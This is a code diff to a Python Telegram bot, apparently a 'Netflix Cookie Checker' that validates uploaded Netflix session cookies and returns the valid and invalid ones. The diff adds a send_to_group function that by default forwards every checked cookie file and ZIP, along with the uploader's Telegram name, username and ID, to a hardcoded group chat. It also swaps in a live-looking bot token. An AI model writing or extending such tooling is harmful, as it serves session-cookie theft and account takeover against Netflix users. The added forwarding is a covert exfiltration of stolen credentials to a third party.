@@ -15,8 +15,12 @@ from Slowcheck import process_file_and_check as slow_check
 from Logout import process_file_and_check as logout_check
 
 # --- Config ---
-TOKEN = "8270743184:AAEri7VgKj8A-En0R_L9y88fkcPc6iBCK_s"  # Replace with your actual bot token
+TOKEN = "8340045274:AAHGNYpVIGh8B4myxDOan4_CiNqlqwQbEC4"  # Replace with your actual bot token
 UPLOAD_DIR = "uploads"
+
+# Group configuration - Add your group chat ID here
+TARGET_GROUP_ID = "-1003072651464"  # Replace with your group chat ID (include the minus sign)
+SEND_TO_GROUP = True  # Set to False to disable group sending
 
 # Global dictionary to track active processes
 active_processes = {}
@@ -92,6 +96,45 @@ def create_results_zip(results_dir, mode, original_filename, result_type="valid"
         print(f"Error creating {result_type} ZIP file: {e}")
         return None
 
+# --- Helper: Send results to group ---
+async def send_to_group(context, file_path, filename, file_type, original_filename, user_info, mode):
+    """Send results to the target group"""
+    if not SEND_TO_GROUP or not TARGET_GROUP_ID:
+        return
+    
+    try:
+        # Get file size
+        file_size = os.path.getsize(file_path)
+        file_size_mb = file_size / (1024 * 1024)
+        
+        # Create caption with user info
+        username_str = f"@{user_info.get('username')}" if user_info.get('username') else "No username"
+        last_name_str = user_info.get('last_name', '') or ''
+        
+        caption = f"""{'✅ VALID' if file_type == 'valid' else '❌ INVALID'} Cookies
+
+👤 User: {user_info['first_name']} {last_name_str}
+🔗 Username: {username_str}
+🆔 ID: {user_info['id']}
+📁 Original: {original_filename}
+🔍 Mode: {mode.upper()}
+📊 Size: {file_size_mb:.2f} MB"""
+        
+        # Send to group
+        with open(file_path, 'rb') as f:
+            await context.bot.send_document(
+                chat_id=TARGET_GROUP_ID,
+                document=f,
+                filename=filename,
+                caption=caption,
+                parse_mode='Markdown'
+            )
+            
+        print(f"✅ Sent {file_type} results to group: {filename}")
+            
+    except Exception as e:
+        print(f"Error sending to group: {e}")
+
 # --- Helper: Create inline keyboard with valid/invalid counts and STOP button ---
 def create_status_keyboard(valid, invalid, process_id):
     """Create inline keyboard with valid/invalid counts and STOP button"""
@@ -146,6 +189,7 @@ def emergency_stop():
         active_processes[process_id]["stop_flag"] = True
     
     print("🛑 EMERGENCY STOP: All processes halted")
+
 # --- Callback handler for inline buttons (ENHANCED with emergency stop) ---
 async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle inline button callbacks"""
@@ -186,7 +230,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         pass
 
 # --- Helper: Process file with specific mode (ENHANCED with both valid/invalid results) ---
-async def process_file_with_mode(update, file_path, file_name, mode, reply_to_message=None):
+async def process_file_with_mode(update, context, file_path, file_name, mode, reply_to_message=None):
     """Process a file with the specified checking mode"""
     global global_stop_flag
     
@@ -320,9 +364,18 @@ async def process_file_with_mode(update, file_path, file_name, mode, reply_to_me
             # Remove from active processes
             active_processes.pop(process_id, None)
             return
+
         # --- Enhanced results sending logic (send both valid and invalid) ---
         sent_files = 0
         total_size = 0
+        
+        # Get user info for group sending
+        user_info = {
+            'id': update.effective_user.id,
+            'first_name': update.effective_user.first_name,
+            'last_name': update.effective_user.last_name,
+            'username': update.effective_user.username
+        }
         
         if results_dir and os.path.exists(results_dir):
             # Check for valid cookies directory
@@ -354,6 +407,8 @@ async def process_file_with_mode(update, file_path, file_name, mode, reply_to_me
                     valid_zip_path = create_results_zip(results_dir, mode, file_name, "valid")
                     if valid_zip_path:
                         zip_size = os.path.getsize(valid_zip_path)
+                        
+                        # Send to user
                         with open(valid_zip_path, 'rb') as f:
                             await update.message.reply_document(
                                 document=f,
@@ -361,6 +416,18 @@ async def process_file_with_mode(update, file_path, file_name, mode, reply_to_me
                                 caption=f"✅ **Valid Cookies** ({len(valid_files)} files)\n📁 From: `{file_name}`",
                                 parse_mode='Markdown'
                             )
+                        
+                        # Send to group
+                        await send_to_group(
+                            context, 
+                            valid_zip_path, 
+                            os.path.basename(valid_zip_path), 
+                            "valid", 
+                            file_name, 
+                            user_info, 
+                            mode
+                        )
+                        
                         sent_files += 1
                         total_size += zip_size
                 
@@ -369,6 +436,8 @@ async def process_file_with_mode(update, file_path, file_name, mode, reply_to_me
                     invalid_zip_path = create_results_zip(results_dir, mode, file_name, "invalid")
                     if invalid_zip_path:
                         zip_size = os.path.getsize(invalid_zip_path)
+                        
+                        # Send to user
                         with open(invalid_zip_path, 'rb') as f:
                             await update.message.reply_document(
                                 document=f,
@@ -376,6 +445,18 @@ async def process_file_with_mode(update, file_path, file_name, mode, reply_to_me
                                 caption=f"❌ **Invalid Cookies** ({len(invalid_files)} files)\n📁 From: `{file_name}`",
                                 parse_mode='Markdown'
                             )
+                        
+                        # Send to group
+                        await send_to_group(
+                            context, 
+                            invalid_zip_path, 
+                            os.path.basename(invalid_zip_path), 
+                            "invalid", 
+                            file_name, 
+                            user_info, 
+                            mode
+                        )
+                        
                         sent_files += 1
                         total_size += zip_size
                 
@@ -391,6 +472,8 @@ async def process_file_with_mode(update, file_path, file_name, mode, reply_to_me
                     file_path_result = os.path.join(valid_dir, filename)
                     try:
                         file_size = os.path.getsize(file_path_result)
+                        
+                        # Send to user
                         with open(file_path_result, 'rb') as f:
                             await update.message.reply_document(
                                 document=f,
@@ -398,6 +481,18 @@ async def process_file_with_mode(update, file_path, file_name, mode, reply_to_me
                                 caption="✅ **Valid Cookie**",
                                 parse_mode='Markdown'
                             )
+                        
+                        # Send to group
+                        await send_to_group(
+                            context, 
+                            file_path_result, 
+                            filename, 
+                            "valid", 
+                            file_name, 
+                            user_info, 
+                            mode
+                        )
+                        
                         sent_files += 1
                         total_size += file_size
                     except Exception as e:
@@ -408,6 +503,8 @@ async def process_file_with_mode(update, file_path, file_name, mode, reply_to_me
                     file_path_result = os.path.join(invalid_dir, filename)
                     try:
                         file_size = os.path.getsize(file_path_result)
+                        
+                        # Send to user
                         with open(file_path_result, 'rb') as f:
                             await update.message.reply_document(
                                 document=f,
@@ -415,6 +512,18 @@ async def process_file_with_mode(update, file_path, file_name, mode, reply_to_me
                                 caption="❌ **Invalid Cookie**",
                                 parse_mode='Markdown'
                             )
+                        
+                        # Send to group
+                        await send_to_group(
+                            context, 
+                            file_path_result, 
+                            filename, 
+                            "invalid", 
+                            file_name, 
+                            user_info, 
+                            mode
+                        )
+                        
                         sent_files += 1
                         total_size += file_size
                     except Exception as e:
@@ -446,6 +555,8 @@ async def process_file_with_mode(update, file_path, file_name, mode, reply_to_me
                 pass
         else:
             # Send a completion summary
+            group_status = "✅ Also sent to group" if SEND_TO_GROUP and TARGET_GROUP_ID else "❌ Group sending disabled"
+            
             summary_msg = await update.message.reply_text(
                 f"🎉 **Processing Complete!**\n"
                 f"📁 File: `{file_name}`\n"
@@ -453,7 +564,8 @@ async def process_file_with_mode(update, file_path, file_name, mode, reply_to_me
                 f"✅ Valid: {progress['valid']}\n"
                 f"❌ Invalid: {progress['invalid']}\n"
                 f"📦 Total Processed: {progress['checked']}\n"
-                f"📤 Files Sent: {sent_files}",
+                f"📤 Files Sent: {sent_files}\n\n"
+                f"📢 Group: {group_status}",
                 parse_mode='Markdown'
             )
             # Delete summary after 10 seconds
@@ -498,15 +610,22 @@ async def process_file_with_mode(update, file_path, file_name, mode, reply_to_me
         
         # Remove from active processes
         active_processes.pop(process_id, None)
+
 # --- Command: /start ---
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    welcome_text = """🍿 **Netflix Cookie Checker Bot**
+    group_status = "✅ Enabled" if SEND_TO_GROUP and TARGET_GROUP_ID else "❌ Disabled"
+    
+    welcome_text = f"""🍿 **Netflix Cookie Checker Bot**
 
 📋 **How to use:**
 
 • `/fastcheck` - Quick validation
 • `/slowcheck` - Thorough validation  
 • `/logout` - Logout check
+
+📢 **Group Sharing:** {group_status}
+
+Just send me a file or reply to one with a command!
     """
     await update.message.reply_text(welcome_text, parse_mode='Markdown')
 
@@ -554,6 +673,7 @@ async def handle_command_reply(update: Update, context: ContextTypes.DEFAULT_TYP
             # Process the file with the specified mode
             await process_file_with_mode(
                 update, 
+                context,
                 file_path, 
                 replied_message.document.file_name, 
                 mode,
@@ -607,7 +727,7 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
             )
             
             # Process the file automatically without confirmation message
-            await process_file_with_mode(update, file_path, doc.file_name, mode)
+            await process_file_with_mode(update, context, file_path, doc.file_name, mode)
             
         except Exception as e:
             temp_msg = await update.message.reply_text(f"❌ Error processing file: {str(e)}")
@@ -675,8 +795,19 @@ def main():
     print("   • Inline buttons for valid/invalid counts")
     print("   • STOP button to halt ALL processing")
     print("   • Both valid AND invalid results sent back")
+    print("   • GROUP SHARING: Results also sent to specified group")
     print("🗂️ Archive support: ZIP/RAR files supported")
     print("🛑 Emergency stop: Ctrl+C to stop all processes")
+    print(f"📢 Group sharing: {'Enabled' if SEND_TO_GROUP and TARGET_GROUP_ID else 'Disabled'}")
+    
+    if SEND_TO_GROUP and TARGET_GROUP_ID:
+        print(f"📋 Target group ID: {TARGET_GROUP_ID}")
+    else:
+        print("⚠️ To enable group sharing:")
+        print("   1. Add your bot to a group as admin")
+        print("   2. Get the group chat ID")
+        print("   3. Update TARGET_GROUP_ID in the config")
+        print("   4. Set SEND_TO_GROUP = True")
     
     try:
         app.run_polling(allowed_updates=Update.ALL_TYPES)
@@ -689,6 +820,4 @@ def main():
 
 if __name__ == '__main__':
     main()
-
-
 
